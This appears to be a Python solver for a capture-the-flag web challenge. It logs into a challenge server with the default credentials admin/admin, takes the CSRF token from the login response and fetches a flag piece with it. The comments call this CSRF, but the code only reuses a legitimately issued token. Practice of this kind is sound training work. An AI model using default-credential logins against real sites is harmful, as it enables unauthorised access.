#!/usr/bin/env python3

#CSRF/XSRF Cross Site request forgery
# Vulnerability at which some dynamic websites are exposed when they are made
# to receive request from a client without checking if the request was intentional or not.
# CSRF take advantage of trust of  website in a user's browser.

from http.cookiejar import CookieJar
import requests
from requests import cookies
from requests.sessions import Session
from urllib3.util import response

def main():
    s = requests.Session()
    url = "http://web-11.challs.olicyber.it/login"
    payload = {"username":"admin","password":"admin"}
    cookies = get_cookies(s,url,payload)
    # for cookie in cookies:
        # cookie_value = cookie.value
    crsf_t = get_csrf_token(s,url,payload)
    print(f"crsf = {crsf_t}")
    r = requests.get(f"http://web-11.challs.olicyber.it/flag_piece?index=0&csrf={crsf_t}",cookies=cookies)
    print(r.text)


def get_cookies(s:Session,url:str,payload:dict)->CookieJar:
    session = s.post(url,json=payload)
    cookies = session.cookies
    return cookies


def get_csrf_token(s:Session,url:str,payload:dict)->str:
    session = s.post(url,json=payload)
    json_data = session.json()
    return json_data['csrf']

if __name__ == "__main__":
    main()
